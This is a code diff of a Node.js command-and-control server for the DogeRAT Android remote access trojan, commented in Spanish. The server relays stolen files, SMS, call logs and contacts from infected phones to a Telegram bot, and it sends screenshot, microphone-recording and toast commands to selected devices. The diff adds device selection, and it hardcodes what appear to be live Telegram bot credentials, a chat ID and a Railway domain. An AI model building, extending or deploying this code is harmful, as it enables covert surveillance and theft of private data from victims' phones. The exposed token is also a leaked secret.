@@ -1,7 +1,7 @@
-// RAT C2 Server - Versión Hardcoded (Credenciales directas)
-// ESTE ARCHIVO CONTIENE CREDENCIALES SENSIBLES. NO COMPARTIR PÚBLICAMENTE.
+// RAT C2 Server - Lógica Original Restaurada y Hardcoded
+// Este código replica el flujo exacto: Seleccionar Dispositivo -> Seleccionar Acción -> Ejecutar
+// Incluye correcciones para Railway y Seguridad.
 
-// Dependencias
 const express = require('express'),
     http = require('http'),
     { Server } = require('socket.io'),
@@ -13,72 +13,55 @@ const express = require('express'),
 // 🚨 --- ZONA DE CONFIGURACIÓN MANUAL (HARDCODED) --- 🚨
 // ==================================================================
 
-// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ (Mantén las comillas)
-// Ejemplo: const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh...";
+// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
 const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 
 
 // 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
-// Ejemplo: const MANUAL_DOMAIN = "https://mi-proyecto.up.railway.app";
 const MANUAL_DOMAIN = "ratserver-production-96a6.up.railway.app";
 
+// 3. PEGA TU ID DE CHAT DE TELEGRAM AQUÍ
+const MANUAL_CHAT_ID = "6775348523";
+
 // ==================================================================
-// ------------------------------------------------------------------
 
-// --- Diagnóstico de Inicio ---
-console.log("=== INICIANDO SERVIDOR CON CREDENCIALES MANUALES ===");
-console.log("Token configurado (longitud):", MANUAL_TOKEN.length);
-console.log("Dominio configurado:", MANUAL_DOMAIN);
-
-// Validación básica para evitar el crash si se te olvida poner el token
-if (MANUAL_TOKEN === "PEGAR_TU_TOKEN_AQUI" || MANUAL_TOKEN.length < 20) {
-    console.error("❌ ERROR FATAL: No has reemplazado el token en el código.");
-    console.error("Edita server.js y pon tu token real en la variable MANUAL_TOKEN.");
-    process.exit(1); // Detener ejecución para no saturar logs
+// Validación de Credenciales
+if (MANUAL_TOKEN.includes("PEGAR") || MANUAL_CHAT_ID.includes("PEGAR")) {
+    console.error("❌ ERROR: Faltan credenciales en server.js");
+    process.exit(1);
 }
 
-// --- Configuración de Sistema de Archivos ---
-const DATA_FILE = './data.json';
+// Configuración de Directorios
 const FILE_DIR = 'file';
+if (!fs.existsSync(FILE_DIR)) try { fs.mkdirSync(FILE_DIR); } catch (e) {}
 
-if (!fs.existsSync(FILE_DIR)) {
-    try { fs.mkdirSync(FILE_DIR); } catch (e) { console.error("Error creando directorio file:", e); }
-}
-
-if (!fs.existsSync(DATA_FILE)) {
-    try { fs.writeFileSync(DATA_FILE, '[]', 'utf8'); } catch (e) { console.error("Error creando data.json:", e); }
-}
-
-// --- Inicialización del Bot ---
-// Usamos la variable manual directamente. Se aplica trim() por seguridad.
-const bot = new TelegramBot(MANUAL_TOKEN.trim(), {
-    polling: true
-});
-
+// Inicialización
+const bot = new TelegramBot(MANUAL_TOKEN.trim(), { polling: true });
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Middleware para JSON
-app.use(express.json()); 
+app.use(express.json());
 app.use(express.static('HTML'));
 
-// --- Almacenamiento ---
-const connectedDevices = new Map();
-const currentActions = new Map();
+// --- Estado del Sistema ---
+const connectedDevices = new Map(); // Guarda los sockets de los dispositivos
+const currentActions = new Map();   // Máquina de estados: Guarda qué está haciendo el usuario (chatId -> estado)
+const selectedDevice = new Map();   // Guarda qué dispositivo seleccionó el usuario (chatId -> deviceId)
 
+// Configuración Multer
 const storage = multer.diskStorage({
     destination: (req, file, cb) => cb(null, FILE_DIR),
     filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
 });
 const upload = multer({ storage: storage });
 
-// --- Rutas HTTP (Uploads y Texto) ---
+// --- Rutas HTTP (Entrada de datos desde Android) ---
 
 app.post('/upload', upload.single('file'), (req, res) => {
     const deviceId = req.headers['currentTarget'];
     if (deviceId && connectedDevices.get(deviceId)) {
-        bot.sendMessage(connectedDevices.get(deviceId).chatId, 
-            `<b>✯ Archivo Recibido ✯</b>\n\nDispositivo: ${connectedDevices.get(deviceId).model}\nArchivo: ${req.file.originalname}\nURL: ${MANUAL_DOMAIN}/file/${req.file.filename}`, 
+        bot.sendMessage(MANUAL_CHAT_ID, 
+            `<b>✯ Archivo Recibido ✯</b>\n\nDe: ${connectedDevices.get(deviceId).model}\nArchivo: ${req.file.originalname}\nURL: ${MANUAL_DOMAIN}/file/${req.file.filename}`, 
             { parse_mode: 'HTML' }
         );
     }
@@ -88,148 +71,179 @@ app.post('/upload', upload.single('file'), (req, res) => {
 app.post('/text', (req, res) => {
     const deviceId = req.headers['currentTarget'];
     if (deviceId && connectedDevices.get(deviceId)) {
-        bot.sendMessage(connectedDevices.get(deviceId).chatId, 
-            `<b>✯ Datos Recibidos ✯</b>\n\nDispositivo: ${connectedDevices.get(deviceId).model}\n\n${req.body.text}`, 
+        bot.sendMessage(MANUAL_CHAT_ID, 
+            `<b>✯ Datos Recibidos ✯</b>\n\nDe: ${connectedDevices.get(deviceId).model}\n\n${req.body.text}`, 
             { parse_mode: 'HTML' }
         );
     }
     res.send('Done');
 });
 
-// --- Lógica Socket.IO (Conexión de dispositivos) ---
+// --- Lógica Socket.IO (Conexión Android) ---
 
 io.on('connection', socket => {
-    const headers = socket.handshake.headers;
-    const deviceId = headers['currentTarget'];
-    const model = headers['model'];
-    
-    // Debug en logs de Railway para ver si entra conexión
-    console.log(`[Socket] Nueva conexión entrante. ID: ${deviceId}, Modelo: ${model}`);
+    const h = socket.handshake.headers;
+    const deviceId = h['currentTarget'];
+    const model = h['model'];
 
     if (deviceId && !connectedDevices.get(deviceId)) {
+        console.log(`[Socket] Nuevo dispositivo: ${model}`);
         connectedDevices.set(deviceId, {
             socket: socket,
             model: model,
-            version: headers['version'],
-            time: headers['time'],
-            ip: headers['host'],
-            currentAction: 'no information',
-            chatId: '' // Se llenará con los IDs de data.json
+            version: h['version'],
+            ip: h['host'],
+            id: deviceId
         });
 
-        // Notificar a todos los admins registrados en data.json
-        try {
-            const admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            admins.forEach(chatId => {
-                connectedDevices.get(deviceId).chatId = chatId;
-                bot.sendMessage(chatId, 
-                    `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\nModelo: ${model}\nIP: ${headers['host']}\nID: ${deviceId}`, 
-                    { parse_mode: 'HTML' }
-                );
-            });
-        } catch (e) {
-            console.log('Error notificando admins:', e);
-        }
+        bot.sendMessage(MANUAL_CHAT_ID, 
+            `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\nModelo: ${model}\nIP: ${h['host']}\nID: ${deviceId}`, 
+            { parse_mode: 'HTML' }
+        );
     }
 
     socket.on('disconnect', () => {
-        const device = connectedDevices.get(deviceId);
-        if (device) {
-            bot.sendMessage(device.chatId, `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${device.model}`, { parse_mode: 'HTML' });
+        if (connectedDevices.has(deviceId)) {
+            bot.sendMessage(MANUAL_CHAT_ID, `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${model}`, { parse_mode: 'HTML' });
             connectedDevices.delete(deviceId);
         }
     });
 
     socket.on('commend', data => {
-        const device = connectedDevices.get(deviceId);
-        if (device) {
-            bot.sendMessage(device.chatId, `<b>Respuesta del Dispositivo:</b>\n${data}`, { parse_mode: 'HTML' });
-            device.currentAction = 'no information';
-        }
+        bot.sendMessage(MANUAL_CHAT_ID, `<b>Respuesta:</b>\n${data}`, { parse_mode: 'HTML' });
     });
 });
 
-// --- Lógica del Bot de Telegram ---
+// --- Lógica del Bot (RESTAURACIÓN DEL FLUJO ORIGINAL) ---
 
 bot.on('message', async msg => {
     const chatId = msg.chat.id;
     const text = msg.text;
 
     if (!text) return;
+    
+    // SEGURIDAD: Solo tú puedes usar el bot
+    if (String(chatId) !== String(MANUAL_CHAT_ID)) return;
 
-    // Gestión de Admins (Auto-registro al enviar cualquier mensaje)
-    let admins = [];
-    try {
-        admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-    } catch (e) { admins = []; }
-
-    if (!admins.includes(chatId)) {
-        admins.push(chatId);
-        fs.writeFileSync(DATA_FILE, JSON.stringify(admins), 'utf8');
-        console.log(`[Admin] Nuevo admin registrado: ${chatId}`);
-    }
-
-    // Comandos Básicos
-    if (text === '/start' || text.includes('Main menu')) {
-        const deviceCount = connectedDevices.size;
+    // 1. Menú Principal
+    if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
+        currentActions.delete(chatId); // Reset estado
+        selectedDevice.delete(chatId); // Reset selección
+        
         bot.sendMessage(chatId, 
-            `<b>✯ DOGERAT C2 ONLINE ✯</b>\n\nDispositivos Conectados: ${deviceCount}\nDominio: ${MANUAL_DOMAIN}`, 
+            `<b>✯ DOGERAT C2 ✯</b>\nDispositivos: ${connectedDevices.size}`, 
             {
                 parse_mode: 'HTML',
                 reply_markup: {
-                    keyboard: [
-                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
-                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
-                    ],
+                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                     resize_keyboard: true
                 }
             }
         );
-    } 
-    // Lógica para listar dispositivos
+    }
+
+    // 2. Listar Dispositivos (Para seleccionar uno específico)
     else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
-        if (connectedDevices.size > 0) {
-            let deviceList = [];
-            connectedDevices.forEach((device, id) => {
-                deviceList.push([device.model]); // Usar solo nombre para simplificar botón
-            });
-            deviceList.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
-            
-            bot.sendMessage(chatId, '<b>✯ Selecciona un dispositivo ✯</b>', {
-                parse_mode: 'HTML',
-                reply_markup: { keyboard: deviceList, resize_keyboard: true }
-            });
-        } else {
-            bot.sendMessage(chatId, '<b>No hay dispositivos conectados.</b>', { parse_mode: 'HTML' });
+        if (connectedDevices.size === 0) {
+            return bot.sendMessage(chatId, 'No hay dispositivos conectados.');
         }
-    }
-    // Lógica para menú de acciones
-    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
-        bot.sendMessage(chatId, '<b>✯ Panel de Control ✯</b>', {
+        let list = [];
+        connectedDevices.forEach((v, k) => list.push([v.model])); // Usamos el modelo como botón
+        list.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
+        
+        bot.sendMessage(chatId, '<b>Selecciona un dispositivo para controlar:</b>', {
             parse_mode: 'HTML',
-            reply_markup: {
-                keyboard: [
-                    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
-                    ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
-                    ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
-                ],
-                resize_keyboard: true
-            }
+            reply_markup: { keyboard: list, resize_keyboard: true }
         });
     }
-    // Lógica simplificada de envío de comandos
-    else if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
-        // Enviar a todos o al seleccionado (simplificado a todos para prueba)
-        connectedDevices.forEach((device, id) => {
-            device.socket.emit('commend', 'screenshot'); // El comando raw que espera el RAT
-            bot.sendMessage(chatId, `Comando enviado a ${device.model}`);
+
+    // 3. Menú de Acciones (Solo aparece si hay un dispositivo seleccionado o es acción global)
+    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
+        const keyboard = [
+            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
+            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯'],
+            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
+            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
+        ];
+        bot.sendMessage(chatId, '<b>Selecciona una acción:</b>', {
+            parse_mode: 'HTML',
+            reply_markup: { keyboard: keyboard, resize_keyboard: true }
         });
+    }
+
+    // 4. Lógica de Selección de Dispositivo (Cuando pulsas el nombre del móvil)
+    else {
+        // ¿El texto coincide con el nombre de un dispositivo conectado?
+        let targetId = null;
+        connectedDevices.forEach((dev, id) => {
+            if (text === dev.model) targetId = id;
+        });
+
+        if (targetId) {
+            // USUARIO SELECCIONÓ UN DISPOSITIVO
+            selectedDevice.set(chatId, targetId);
+            bot.sendMessage(chatId, `<b>Has seleccionado: ${text}</b>\nAhora ve a "Action" para enviar comandos.`, { parse_mode: 'HTML' });
+            return;
+        }
+
+        // 5. Ejecución de Comandos
+        // Verificamos si tenemos un dispositivo seleccionado
+        const currentTargetId = selectedDevice.get(chatId);
+        const device = connectedDevices.get(currentTargetId);
+        
+        // Comandos Directos (No requieren input extra)
+        if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
+            if (device) {
+                device.socket.emit('commend', 'screenshot');
+                bot.sendMessage(chatId, 'Comando Screenshot enviado.');
+            } else {
+                bot.sendMessage(chatId, '⚠️ Primero selecciona un dispositivo en "Devices".');
+            }
+        }
+        else if (text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
+            if (device) {
+                device.socket.emit('commend', 'calls');
+                bot.sendMessage(chatId, 'Pidiendo historial de llamadas...');
+            }
+        }
+        else if (text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
+            if (device) {
+                device.socket.emit('commend', 'contacts');
+                bot.sendMessage(chatId, 'Pidiendo contactos...');
+            }
+        }
+        
+        // Comandos con Input (Estado intermedio)
+        else if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
+            if (device) {
+                currentActions.set(chatId, 'await_mic_duration');
+                bot.sendMessage(chatId, 'Escribe la duración en segundos (ej: 10):');
+            }
+        }
+        else if (text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
+            if (device) {
+                currentActions.set(chatId, 'await_toast_msg');
+                bot.sendMessage(chatId, 'Escribe el mensaje para mostrar en el Toast:');
+            }
+        }
+
+        // 6. Manejo de Inputs (Respuestas a preguntas del bot)
+        else if (currentActions.get(chatId) === 'await_mic_duration') {
+            if (device && !isNaN(text)) {
+                device.socket.emit('microphone', { duration: parseInt(text) });
+                bot.sendMessage(chatId, `Grabando ${text} segundos...`);
+                currentActions.delete(chatId);
+            }
+        }
+        else if (currentActions.get(chatId) === 'await_toast_msg') {
+            if (device) {
+                device.socket.emit('toast', { message: text });
+                bot.sendMessage(chatId, `Toast enviado: "${text}"`);
+                currentActions.delete(chatId);
+            }
+        }
     }
 });
 
-// Inicialización del Servidor
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Servidor escuchando en puerto ${PORT}`);
-    console.log(`Esperando conexiones...`);
-});
+server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
